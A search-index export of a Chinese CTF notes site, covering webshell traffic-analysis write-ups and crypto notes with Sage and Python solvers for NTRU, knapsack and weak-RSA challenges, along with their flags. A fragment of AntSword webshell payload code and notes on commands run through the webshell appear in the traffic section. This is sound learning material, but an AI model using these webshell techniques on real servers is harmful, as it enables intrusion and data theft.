</ul>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#litctf-2024","title":"LitCTF 2024","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#_1","title":"\u5973\u88c5\u7167\u6d41\u91cf","text":"<p>\u9898\u76ee ez_flow.zip \u9898\u89e3</p> <p>\u4ece\u6d41\u91cf\u4e0a\u770b TCP \u5360\u591a\uff0c\u5728\u7edf\u8ba1&gt;\u534f\u8bae\u5206\u7ea7 \u4e2d\u53ef\u4ee5\u770b\u5230 HTTP \u7684\u201c\u4fe1\u606f\u201d\u5f88\u591a\uff1b\u7b5b\u9009 http \uff0c\u5224\u65ad\u662f\u5728\u4e0a\u4f20\u5f88\u591a\u6587\u4ef6 =&gt; \u6587\u4ef6&gt;\u5bfc\u51fa\u5bf9\u8c61&gt;HTTP&gt;\u5168\u90e8\u4fdd\u5b58 \u3002\u63a5\u4e0b\u6765\u68c0\u67e5\u8fd9\u4e9b\u6587\u4ef6\u3002</p> <ul> <li>jpg \u6587\u4ef6\u786e\u5b9e\u662f\u5973\u88c5\u7167\uff0c\u6709\u5174\u8da3\u81ea\u5df1\u770b \u8bf4\u4e0d\u5b9a\u85cf\u4e86\u4fe1\u606f\u5462</li> <li>ma.php \u7cfb\u7c7b\u6587\u4ef6\uff0c\u4e00\u4e00\u68c0\u67e5\uff1b\u5bf9\u4e8e\u660e\u663e\u662f url \u7f16\u7801\u7684\u5185\u5bb9\uff0c\u89e3\u7801\u540e\u53d1\u73b0\u90fd\u6709\u7c7b\u4f3c\u4e8e <code>$p=base64_decode(substr($_POST[\"da8af99c22690c\"],2));</code> \u7684\u8bed\u53e5\uff0c\u610f\u4e3a\u5c06\u8be5\u952e\u7684\u503c\u4ece\u7b2c\u4e8c\u4f4d\u8d77\uff080 \u4e3a\u9996\u4f4d\uff0c\u6545\u4e0d\u5305\u542b\u7b2c\u4e8c\u4e2a\u5b57\u7b26\uff09\u7684\u5b57\u7b26\u4e32\u8fdb\u884c base \u89e3\u7801\uff1b\u6211\u4eec\u641c\u7d22\u8be5\u952e\uff0c\u5c31\u80fd\u627e\u5230\u76f8\u5e94\u7684\u503c<ul> <li>\u5c1d\u8bd5\u5230 ma(14).php \u65f6\uff0c\u51fa\u73b0\u5bc6\u7801 <code>PaSsw0rd_LitCtF_L0vely_tanJi</code>\u3002</li> <li>\u5c1d\u8bd5\u5230 ma(19).php \u65f6\uff0c\u53d1\u73b0\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f7f\u7528 file \u68c0\u6d4b\uff08\u6216\u8005\u7ed3\u5408\u8fc7\u7a0b\u4e2d\u7684\u4fe1\u606f\u731c\u4e00\u731c\u4e5f\u77e5\u9053\u662f zip\uff09\u66f4\u6539\u6269\u5c55\u540d\uff0c\u4f7f\u7528\u5bc6\u7801\u5f97\u5230 flag\u3002</li> </ul> </li> <li>\u5269\u4e0b\u7684\u6587\u4ef6\u6709\u5174\u8da3\u53ef\u4ee5\u63a2\u7d22\uff1f</li> </ul> <p>Flag</p> <p>LitCTF{anTsw0rd_fl0w_is_eAsY_f0r_u}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#eis-2019","title":"EIS 2019","text":"<p>\u63d0\u4ea4\u5e73\u53f0\uff1aNSSCTF</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#webshell","title":"webshell","text":"<p>\u9898\u76ee \u9898\u89e3\u53c2\u8003</p> <p>Flag</p> <p>flag{AntSword_is_Powerful_3222222!!!!}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#2021","title":"\u9647\u5251\u676f 2021","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#webshell_1","title":"WebShell","text":"<p>\u9898\u76ee\uff1a WebShell</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#1","title":"\u95ee 1","text":"<p>\u4f7f\u7528 wireshark \u6253\u5f00 hack.pcap\uff0c\u8fc7\u6ee4\u542b\u6709 \"password\" \u7684\u6587\u4ef6\uff0c\u53ea\u6709\u4e24\u4e2a\uff0c\u76f4\u63a5 <code>ctrl+f</code> \u627e \"password\"\uff0c\u5982\u56fe\uff1a</p> <p></p> <p>\u6ce8\u610f\u662f base64 \u89e3\u7801\uff1a</p> <p>Flag</p> <p>NSSCTF{Admin123!@#}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#2","title":"\u95ee 2","text":"<p>\u540c\u7406\uff0c\u627e \".log\" \uff1a</p> <p></p> <p>\u4f46\u662f\u4e0d\u77e5\u9053\u7edd\u5bf9\u8def\u5f84\uff0c\u4f46\u662f\u770b <code>a</code> \u7684\u503c\uff0c\u662f\u5728\u6267\u884c\u547d\u4ee4\uff0c\u5f80\u4e0b\u770b\uff0c\u5f97\u5230\uff1a</p> <p></p> <p>Flag</p> <p>NSSCTF{/var/www/html/data/Runtime/Logs/Home/21_08_07.log}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#3","title":"\u95ee 3","text":"<p>\u6743\u9650\u95ee\u9898\u81ea\u7136\u662f\u5148\u627e \"whoami\"\uff0c\u53d1\u73b0\u6709\u4e24\u6761\uff0c\u7b2c\u4e00\u6761\u54cd\u5e94 404 \u5931\u8d25\uff0c\u7b2c\u4e8c\u6761 200 \u6210\u529f\uff0c\u68c0\u67e5 User/Group\uff08\u7528\u6237\u6743\u9650\uff09\uff1a</p> <p></p> <p>Flag</p> <p>NSSCTF{www-data}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#4","title":"\u95ee 4","text":"<p>\u521a\u624d\u6211\u4eec\u4e5f\u770b\u5230\u4e86\uff0c1.php \u3002</p> <p>Flag</p> <p>NSSCTF{1.php}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#5","title":"\u95ee 5","text":"<p>\u67e5\u770b\uff08echo \u8fdb\u5165\uff09 1.php \u4e2d\u7684\u5185\u5bb9\uff1a</p> <p></p> <p>\u641c\u7d22 <code>aaa</code>\uff0c\u4f46\u662f\u786e\u5b9e\u57fa\u7840\u77e5\u8bc6\u4e0d\u8db3\uff0c\u6211\u8fde\u4ec0\u4e48\u662f \u4ee3\u7406\u5de5\u5177\u5ba2\u6237\u7aef \u90fd\u4e0d\u77e5\u9053\uff0c\u770b\u4e86 writeup \uff0c\u91cd\u70b9\u5728\u4e8e\uff1a<code>frpc.ini</code>\uff0c\u6545\uff1a</p> <p>Flag</p> <p>NSSCTF{frpc}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/WEB/Flow_analysis/#6-7","title":"\u95ee 6 &amp; \u95ee 7","text":"<p>\u987a\u7740 aaa \u7684\u641c\u7d22\u770b\u4e0b\u6765\uff1f\u7b80\u800c\u8a00\u4e4b\u89c1 343 \u5e27 <sup>1</sup>\u7684\u5185\u5bb9\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4fe1\u606f\u622a\u65ad\u4e86\uff0c\u8ffd\u8e2a\u628a\u5176\u590d\u5236\u4e0b\u6765\uff0c\u653e\u5165 cyberchef \u4e2d\uff1a</p> <p></p> <p>Flag</p> <p>NSSCTF{0HDFt16cLQJJTN276Gp}</p> <ol> <li> <p>\u4e3a\u4f55\u5f53\u524d\u4e0d\u77e5\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/","title":"Crypto","text":"[crypto]          <ul> <li> RSA_attack  1450  638  13 mins              1739718485 </li> <li> padding_oracle_attack  927  192  5 mins              1739718485 </li> <li> stream_cipher  78  0 mins              1739718485 </li> <li> \u56fd\u5bb6\u5546\u7528\u5bc6\u7801  158  1 mins              1739624158 </li> </ul>","tags":["notes"]},{"location":"CTF/NOTE/crypto/#_1","title":"\u653b\u51fb\u811a\u672c","text":"<ul> <li>crypto-attack<ul> <li>git clone</li> <li>\u53c2\u8003 test \u4ed3\u5e93\u4f7f\u7528</li> </ul> </li> </ul>","tags":["notes"]},{"location":"CTF/NOTE/crypto/#_2","title":"\u77e5\u8bc6\u70b9","text":"<ul> <li>Cracking RNGs: Linear Congruential Generators<ul> <li>what to do if we don't know a, b, n in <code>ax+b(mod n)</code> ?</li> </ul> </li> </ul>","tags":["notes"]},{"location":"CTF/NOTE/crypto/Lattice/","title":"Lattice","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/Lattice/#_1","title":"\u57fa\u7840\u683c\u5bc6\u7801","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/Lattice/#ntru","title":"NTRU","text":"<p>\u7ecf\u5178\u52a0\u5bc6\u7b97\u6cd5\uff0c\u88ab\u683c\u57fa\u89c4\u7ea6\u653b\u7834\uff0c\u89c1\u683c\u5bc6\u7801\u7b14\u8bb0\uff08\u4e00\uff09\u3002</p> <p>\u5728\u4e0a\u9762\u7684\u6587\u7ae0\u4e2d\uff0c\u5f97\u5230\u4e00\u4e2a\u516c\u5f0f\uff1a\u6211\u4eec\u77e5\u9053\uff0c\u5bc6\u94a5\u7684\u5b89\u5168\u6027\u5176\u5b9e\u57fa\u4e8e \\(fh \\equiv g \\pmod r\\)\uff0c\u4e5f\u5373\u662f(\u53d6 fh=g+pr) \u3002</p> <p>\u6784\u9020\u683c\u57fa\u77e9\u9635 M\uff0c\u6211\u4eec\u503e\u5411\u4e8e\uff1a\\(v\\cdot M=\\vec{w}\\) \u5176\u4e2d M \u4e3a\u5df2\u77e5\uff0cw \u4e3a\u9700\u6c42\u91cf\uff0cv \u4e2d\u53ef\u4ee5\u672a\u77e5\u3002</p> \\[ \\begin{pmatrix} f&amp;-r \\end{pmatrix} \\begin{pmatrix} 1&amp;h\\\\0&amp;p \\end{pmatrix} =f(1\\quad h)+(-r)(0\\quad p)=(f\\quad fh-rp) =(f\\quad g) \\] <p>\u4e3a\u4e86\u7b80\u5355\uff0c\u6211\u4eec\u7528 sage \u4e2d\u7684 LLL \u7b97\u6cd5\u89e3\u51b3\u5b83\uff1b\u7531\u4e8e\u4f7f\u7528 LLL \u7b97\u6cd5\u9700\u8981\u6ee1\u8db3\u4f7f\u7528 LLL \u89c4\u7ea6\u9700\u8981\u6ee1\u8db3 Hermite theorem\uff1a\\(||v||\\leq\\sqrt{n}det(L)^{\\frac1n}\\)\uff0c\u5176\u4e2d ||v||\u8868\u793a\u683c\u57fa\u7684\u6570\u91cf\u79ef\uff0cn\u4e3a\u7ef4\u5ea6\uff0cdet(L)\u4e3a\u683cL(\u77e9\u9635)\u7684\u884c\u5217\u5f0f\uff0c\u6211\u4eec\u5f15\u5165 k \u6765\u8fdb\u884c\u8c03\u8282\u3002</p> NTRU_solver.py<pre><code>def NTRU_solver(h, p, c, k=1):\n    from sage.all import *\n    \"\"\" simple NTRU solver \"\"\"\n    \"\"\" k is used for satisfing the condition of LLL, namely Hermite theorem \"\"\"\n    def decrypt(f, g, c):\n        a = c * f % p\n        return a * pow(f, -1, g) % g\n    L = matrix(ZZ,[[1, k*h], [0, k*p]])\n    # L.LLL()\n    w = L.LLL()[0]\n    f, g = abs(w[0]), abs(w[1])//k\n    return decrypt(f, g, c)\n</code></pre> <p>\u6765\u770b\u4e0b\u9762\u7684\u95ee\u9898\uff1a</p> NTRU_chall.py<pre><code>from secret import flag\nimport libnum\n\nbits = 2048\nwhile True:\n  q = random_prime(2^bits, lbound=2^(bits - 1))\n  f = random_prime(2^(3*bits//4 - 1))\n  g = random_prime(2^(bits//4 - 1))\n  if gcd(f, q*g) == 1:\n    h = f.inverse_mod(q) * g % q\n    break\nr = random_prime(2^(3*bits//4 - 1))\nm = libnum.s2n(flag)\nassert m &lt; 2^(bits//4)\nc = (r * h + m) % q\n\nprint('q = %d' % q)\nprint('h = %d' % h)\nprint('c = %d' % c)\n\"\"\"\nq = 24445829856673933058683889356407393860808522483552243481673407476395441107312130500945533047834993780864465577896968035259377721441466959027298166974554621753030728893320770628116412892838297326949997096948374940319126319050202262831370086992122741039059235809755486170276098658609363789670834482459758766315965501103856358827004129316458293962968758091319313119139703281758409686502729987426264868783862562150543872477975124482520151991822540312287812454562890993596447391870392038170902308036014733295394468384998808411243690466996284064331048659179342050962003962851315539367769981491650514319735943099663094899893\nh = 4913183942329791657370364901346185016154546804260113829799181697126245901054001842015324265348151984020885129647620152505641164596983663274947698263948774663097557712000980632171097748594337673511102227336174939704483645747401790373320060474777199502879236509921155985395351647045776678540066383822814858118010995298071799515355111562392871675582742450331679030377003011729873888234401630551097244308473512890467393558048369156638425711104036276296581364374424105121033213701940135560177615395895359023414249846471332180098181632276243857635719541258706892559869642925945927703702696983949003370155033272664851406633\nc = 23952867341969786229998420209594360249658731959635047659110331734424497403162506614140213749790708068086973241468969253395309243550869149482017583754015801740198734485871141965939993554966887039832701333623276590311516052334557237678750680087492306461195312290860900992532859827406262394480605001436094705579158919540851727801502678160085863180222123880690741582667929660533985778430252783414931317574267109741748071838599712027351385462245528001743693258053631099442571041984251010436099847588345982312217135023484895981833846397834589554744611429133085987275209019352039744743479972391909531680560125335638705509351\n\"\"\"\n</code></pre> <p>\u7a0d\u52a0\u9a8c\u8bc1\u53d1\u73b0 Hermite \u4e0d\u6ee1\u8db3\uff1b\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u597d k \u6765\u4f7f\u5f97\u6761\u4ef6\u6ee1\u8db3\uff0c\u8fd9\u91cc n=2\uff1b\u5982\u679c k \u7684\u8303\u56f4\u628a\u63e1\u4e0d\u51c6\uff0c\u7206\u7834\u4e00\u822c\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u7206\u7834\u7684\u5f80\u5f80\u662f\u6307\u6570\uff0c\u5373\uff1a</p> <pre><code>o = 1200\n# for s in range(o-50, o+50):\nfor s in [1200]:\n    try:\n        m = NTRU_solver(h, q, c, k=(1&lt;&lt;s))\n        flag = bytes.fromhex(hex(m)[2:])\n        if b'flag' in flag:\n            print(flag) # b'flag{7c95453a-e577-40d8-9ad0-993655b83b69}'\n    except:\n        continue\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/Lattice/#merklehellman","title":"Merkle\u2013Hellman","text":"<p>\u7ecf\u5178\u7684\u80cc\u5305\u52a0\u5bc6\u95ee\u9898\uff0c\u683c\u5bc6\u7801\u7b14\u8bb0\uff08\u4e8c\uff09 \u8bb2\u7684\u5f88\u6e05\u695a\u4e86\u3002</p> <p>\u5728\u7406\u89e3\u4e0a\uff0c\u6211\u4eec\u5c06\u4e0b\u9762\u8fd9\u9898\u8f6c\u53d8\u4e3a\u4e0a\u9762\u6587\u7ae0\u4e2d\u63cf\u8ff0\u3002</p> hidden-poly<pre><code># https://ctf.xidian.edu.cn/training/10?challenge=148\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import AES\nimport os\n\nq = 264273181570520944116363476632762225021\nkey = os.urandom(16)\niv = os.urandom(16)\nroot = 122536272320154909907460423807891938232\nf = sum([a*root**i for i,a in enumerate(key)])\nassert key.isascii()\nassert f % q == 0\n\nwith open('flag.txt','rb') as f:\n    flag = f.read()\n\ncipher = AES.new(key,AES.MODE_CBC, iv)\nciphertext = cipher.encrypt(pad(flag,16)).hex()\n\nwith open('output.txt','w') as f:\n    f.write(f\"{iv = }\" + \"\\n\")\n    f.write(f\"{ciphertext = }\" + \"\\n\")\n\n\"\"\"\niv = b'Gc\\xf2\\xfd\\x94\\xdc\\xc8\\xbb\\xf4\\x84\\xb1\\xfd\\x96\\xcd6\\\\'\nciphertext = 'd23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e'\n\"\"\"\n</code></pre> <p>\u5982\u679c\u4ee4 f%q = k\uff0c\u90a3\u4e48 S = kq\uff0cM = root\\^i for i in range(16)\uff0cv = key\u3002</p> <p>\\(L=\\begin{bmatrix}I_n&amp;K\\cdot\\vec{v}^T\\\\O_{1\\times n}&amp;K\\cdot q\\end{bmatrix}\\)</p> <p>\u8fd9\u6837\u6211\u4eec\u89e3\u51fa\u6765\u7684 t = (x0, x1... x15) \uff0c\u4e0d\u9700\u8981\u518d\u53d8\u6362\u4e86\u3002</p> hidden-poly_solver.py<pre><code>from sage.all import *\nq = 264273181570520944116363476632762225021\nr = 122536272320154909907460423807891938232\nk = 1&lt;&lt;q.bit_length() # k \u5176\u5b9e\u5f88\u5927(1&lt;&lt;1024)\u4e5f\u662f\u53ef\u884c\u7684\n\nv =  [k*ZZ(r)**i for i in range(16)]\nL = block_matrix([\n    [identity_matrix(16), Matrix(ZZ, 16, 1, v)],\n    [zero_matrix(1, 16), Matrix(ZZ, 1, 1, [k*q])]\n])\n\nt = L.LLL()[0]\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\niv = b'Gc\\xf2\\xfd\\x94\\xdc\\xc8\\xbb\\xf4\\x84\\xb1\\xfd\\x96\\xcd6\\\\'\nciphertext = bytes.fromhex('d23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e')\nkey = \"\".join([chr(t[i]) for i in range(16)]).encode()\ncipher = AES.new(key, AES.MODE_CBC, iv)\nprint(unpad(cipher.decrypt(ciphertext), 16))\n# b'moectf{th3_first_blood_0f_LLL!@#$}'\n</code></pre> <p>\u4f46\u662f\u6211\u5728\u4f7f\u7528\u4e0a\u9762\u7684\u601d\u8def\u505a\u4e0b\u9762 cryptohack \u4e0a\u7684\u95ee\u9898\u65f6\u5931\u8d25\u4e86\uff1a</p> <p>Question</p> <p>cryptohack Backpack Cryptography</p> Backpack Cryptography<pre><code>import random\nfrom collections import namedtuple\nimport gmpy2\nfrom Crypto.Util.number import isPrime, bytes_to_long, inverse, long_to_bytes\n\nFLAG = b\"crypto{??????????????????????????}\"\nPrivateKey = namedtuple(\"PrivateKey\", [\"b\", \"r\", \"q\"])\n\n\ndef gen_private_key(size):\n    s = 10000\n    b = []\n    for _ in range(size):\n        ai = random.randint(s + 1, 2 * s)\n        assert ai &gt; sum(b)  # trapdoor\n        b.append(ai)\n        s += ai\n    while True:\n        q = random.randint(2 * s, 32 * s)\n        if isPrime(q):\n            break\n    r = random.randint(s, q)\n    assert q &gt; sum(b)\n    assert gmpy2.gcd(q, r) == 1\n    return PrivateKey(b, r, q)\n\n\ndef gen_public_key(private_key: PrivateKey):\n    a = []\n    for x in private_key.b:\n        a.append((private_key.r * x) % private_key.q)\n    return a\n\n\ndef encrypt(msg, public_key):\n    assert len(msg) * 8 &lt;= len(public_key)\n    ct = 0\n    msg = bytes_to_long(msg)\n    for bi in public_key:\n        ct += (msg &amp; 1) * bi\n        msg &gt;&gt;= 1\n    return ct\n\n\ndef decrypt(ct, private_key: PrivateKey):\n    ct = inverse(private_key.r, private_key.q) * ct % private_key.q\n    msg = 0\n    for i in range(len(private_key.b) - 1, -1, -1):\n        if ct &gt;= private_key.b[i]:\n            msg |= 1 &lt;&lt; i\n            ct -= private_key.b[i]\n    return long_to_bytes(msg)\n\n\nprivate_key = gen_private_key(len(FLAG) * 8)\npublic_key = gen_public_key(private_key)\nencrypted = encrypt(FLAG, public_key)\ndecrypted = decrypt(encrypted, private_key)\nassert decrypted == FLAG\n\nprint(f\"Public key: {public_key}\")\nprint(f\"Encrypted Flag: {encrypted}\")\n</code></pre> <p>\u4e0d\u96be\u53d1\u73b0\u95ee\u9898\u672c\u8eab\u662f\u548c\u524d\u9762\u76f8\u4f3c\u7684\uff0c\u4f46\u662f\u4f7f\u7528\u548c\u4e4b\u524d\u4e00\u6837\u7684\u811a\u672c\u89e3\u51fa\u6765\u7684\u683c\u57fa\u6ca1\u6709\u80fd\u591f\u6062\u590d\u94ed\u6587\u7684\u91cf\uff1b\u5982\u4e0b\u6539\u8fdb<sup>1</sup>\u540e\u53ef\u884c\uff1a</p> optimal?bp_solver<pre><code>from sage.all import *\npk = [...] # public_key\nn = len(pk)\nk = ceil(sqrt(n) / 2)\ndense = 1/2\npk = [k*p for p in pk]\nc = 45690752833299626276860565848930183308016946786375859806294346622745082512511847698896914843023558560509878243217521\nE = identity_matrix(ZZ, n)\nM = block_matrix(QQ, 2, 2, [E, matrix(QQ, n, 1, pk), \n                matrix([dense for _ in range(n)]), matrix(QQ, [k*c])])\nL = M.LLL()\n# print(L)\nfor j, e in enumerate(L):\n    if e[-1] == 0:\n        msg = 0\n        isValidMsg = True\n        for i in range(len(e) - 1):\n            ei = abs(e[i] - dense)\n            if ei != 1 and ei != 0:\n                isValidMsg = False\n                break\n\n            msg |= int(ei) &lt;&lt; i\n\n        if isValidMsg:\n            print(f\"{j}th: {e}\")\n            print(bytes.fromhex(hex(msg)[2:]))\n# crypto{my_kn4ps4ck_1s_l1ghtw31ght}\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/Lattice/#_2","title":"\u590d\u73b0","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/Lattice/#rarctf-2021-snore","title":"RaRCTF 2021 Snore","text":"<p>Todo</p> <p>https://jgeralnik.github.io/writeups/2021/08/12/Lattices/</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/Lattice/#_3","title":"\u53c2\u8003\u8d44\u6599","text":"<p>\u4e0a\u9762\u6709\u6240\u63d0\u53ca\u7684\u6b64\u5904\u53ef\u80fd\u6ca1\u6709\u5199\u5165\u3002</p> <ul> <li>\u5bc6\u7801\u5b66\u57fa\u7840\u4e4b\u683c\u7406\u8bba\u57fa\u7840</li> <li>\u5bc6\u7801\u5b66\u57fa\u7840\u4e4b\u683c\u4e2d\u96be\u9898\u4e0e\u683c\u57fa\u89c4\u7ea6</li> <li>\u683c\u5bc6\u7801\u5e94\u7528</li> <li>sage - Discrete subgroups of Zn</li> </ul> <ol> <li> <p>\u6539\u8fdb\u539f\u7406\u53ef\u80fd\u8981\u770b\u8fd9\u7bc7\u8bba\u6587 \u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/","title":"RSA attack","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_1","title":"\u57fa\u672c\u539f\u7406","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_2","title":"\u52a0\u5bc6\u539f\u7406","text":"<ol> <li>\u5bfb\u627e\u4e24\u4e2a\u5927\u8d28\u6570 p, q\uff08p/q \u4e4b\u95f4\u7684\u5173\u7cfb\u6682\u4e14\u4e0d\u8c08\uff0c\u4e0d\u5f53\u7684\u9009\u53d6\u5c31\u4f1a\u5bfc\u81f4\u653b\u51fb\u6f0f\u6d1e\uff09\uff1b</li> <li>n = pq; \\(phi = \\phi(n) = (p-1)(q-1)\\) \uff08\u6b27\u62c9\u51fd\u6570\uff09</li> <li>\u5bfb\u627e\u4e00\u4e2a e\uff0c\u4f7f\u5f97\uff1a\\(1&lt;e&lt;phi\\) \u4e14 gcd(e, phi) = 1</li> <li>m \u4e3a\u660e\u6587\u6620\u5c04\u4e3a\u7684\u5927\u6570\uff0c\u5219\u5bc6\u6587 \\(c\\equiv m^e\\pmod{n}\\)</li> <li>(e, n) \u4f5c\u4e3a\u516c\u94a5\u516c\u5f00\u3002</li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_3","title":"\u89e3\u5bc6\u539f\u7406","text":"<ol> <li>\u79c1\u94a5\u4e3a \\(d=e^-1\\pmod{\\phi(n)}\\)</li> <li>\\(c^d = m^{ed}\\pmod{n} = m^{ed\\pmod{\\phi(n)}} =m\\)</li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_4","title":"\u5b89\u5168\u6027\u4fdd\u8bc1","text":"<p>\u6b63\u5e38 \u7684 RSA \u7684\u5b89\u5168\u6027\u5b8c\u5168\u6765\u81ea n \u7684\u8d28\u6570\u5206\u89e3\u96be\u5ea6\uff1b\u4e0d\u6b63\u5e38\u7684\u662f\u4ec0\u4e48\uff1f\u770b\u4e0b\u9762\u5c31\u77e5\u9053\u4e86\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#_5","title":"\u6307\u6570\u653b\u51fb","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#low-public-exponent-attack","title":"Low public exponent attack\uff08\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb\uff09","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#e-1","title":"e = 1","text":"<p>Question</p> <p>cryptohack - Salty</p> <p>cryptohack \u4e0a\u521a\u597d\u6709\u8fd9\u4e48\u4e00\u4e2a\u9898\uff0c\u5c31\u4e00\u5e76\u653e\u5728\u8fd9\u91cc\u4e86\uff1a</p> <pre><code>n = 110581795715958566206600392161360212579669637391437097703685154237017351570464767725324182051199901920318211290404777259728923614917211291562555864753005179326101890427669819834642007924406862482343614488768256951616086287044725034412802176312273081322195866046098595306261781788276570920467840172004530873767                                                                  \ne = 1\nct = 44981230718212183604274785925793145442655465025264554046028251311164494127485\nfor i in range(123456789):\n    pt = ct + i * n\n    plaintext = bytes.fromhex(hex(pt)[2:])\n    if b'crypto' in plaintext:\n        print(\"i =\", i, plaintext) # i = 0 b'crypto{saltstack_fell_for_this!}'\n        break\n    if i % 10000 == 0:\n        print(i)\n</code></pre> <p>Flag</p> <p>crypto{saltstack_fell_for_this!}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/crypto/RSA_attack/#e-2-rabin","title":"e = 2 (Rabin)","text":"<p>\\(\\phi=(p-1)(q-1)\\) \u4e14\u7531\u4e8e p/q \u4e3a\u7d20\u6570\uff0c\u6240\u4ee5 \\(gcd(e, \\phi)\\neq 1\\) \uff0c\u90a3\u4e48\u600e\u4e48\u505a\uff1f</p> <p>\u56de\u987e \\(c=m^e\\pmod{n}\\) \uff0c\u73b0\u5728\u5c31\u662f \\(m^2=c\\pmod{n}\\) \u3002</p> <p>\u5982\u679c \\(m^e &lt; n\\) \uff0c\u90a3\u4e48\u751a\u81f3\u4e0d\u7528\u53d6\u6a21\u4e86\uff0c\u76f4\u63a5\u5f00\u6839\uff1a</p> m^e &lt; n<pre><code>c = 42482525051044\ne = 2\nlong_to_bytes(gmpy2.iroot(c, e)[0]) # b'ctf'\n</code></pre> <p>\u5982\u679c\u8981\u53d6\u6a21\u5462\uff1f\u53ef\u4ee5\u4f7f\u7528 Rabin \u7b97\u6cd5 \u8f6c\u53d8\u4e3a\u4e8c\u6b21\u5269\u4f59\u95ee\u9898\u3002\u4f46\u662f\u6ce8\u610f\uff0c\u8fd9\u4e00\u5207\u7684\u524d\u63d0\u662f\u6a21\u6570\u4e3a\u7d20\u6570\uff1bn \u53c8\u4e0d\u662f\u7d20\u6570\uff0c\u600e\u4e48\u505a\uff1f</p> e = 2<pre><code>n = 87924348264132406875276140514499937145050893665602592992418171647042491658461\ne = 2\npt = \"darctf{xxx}\"\nm = int(pt.encode().hex(), 16)\nc = pow(m, e, n)\nprint(c) \n# 55804540899466191494822903355151119222813727476411593093741269550876471676261\n</code></pre> <p>\u4f5c\u4e3a\u7ec3\u4e60\uff0c\u6211\u4f7f\u7528\u4e86\u4e00\u4e2a\u8f83\u5c0f\u7684 n \uff0c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5206\u89e3\uff1a</p> <pre><code>n = 275127860351348928173285174381581152299 * 319576316814478949870590164193048041239\n</code></pre> \\[ m^2 \\equiv c\\pmod{n} \\iff \\begin{cases}m^2\\equiv c\\pmod{p}\\\\m^2\\equiv c\\pmod{q}\\end{cases} \\] <p>\u5728 m \u7684\u89e3\u4e2a\u6570 \u4e2d\u7684\u7ed3\u8bba\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u5bf9\u4e8e\u4e0a\u65b9\u53f3\u4fa7\u7684\u6bcf\u4e2a\u65b9\u7a0b\uff0c\u90fd\u6709 gcd(e, p-1) = 2 \u4e2a\u89e3\uff0c\u5206\u522b\u8bb0\u4f5c <code>[x1, x2] [y1, y2]</code> <sup>1</sup>\u3002</p> rabin<pre><code>n = 275127860351348928173285174381581152299 * 319576316814478949870590164193048041239\np, q = 275127860351348928173285174381581152299, 319576316814478949870590164193048041239\n\nimport gmpy2\n\ndef squareMod(c, mod):          # \u6a21\u610f\u4e49\u4e0b\u5f00\u6839\uff0c\u627e\u5230 x, \u4f7f\u5f97 x^2 % mod = c\n    assert(mod % 4 == 3)\n    res = gmpy2.powmod(c, (mod+1)//4, mod)\n    return res, mod - res\n\ndef getPlaintext(x, y, p, q):   # \u5047\u8bbe m%p=x, m%q=y, \u6c42\u660e\u6587\n    res = x*q*gmpy2.invert(q, p) + y*p*gmpy2.invert(p, q)\n    return res % (p*q)\n\ndef solve(c, p, q):             # \u5df2\u77e5 p,q, \u89e3\u5bc6 c\n    px = squareMod(c, p)\n    py = squareMod(c, q)\n\n    for x in px:\n        for y in py:\n            yield getPlaintext(x, y, p, q)\n\nc = 55804540899466191494822903355151119222813727476411593093741269550876471676261\np = 275127860351348928173285174381581152299\nq = 319576316814478949870590164193048041239\n\nfor msg in solve(c, p, q):\n    res = hex(msg)[2:]\n    if len(res) % 2 == 1:\n        res = '0' + res\n    print(bytes.fromhex(res))\n\n# 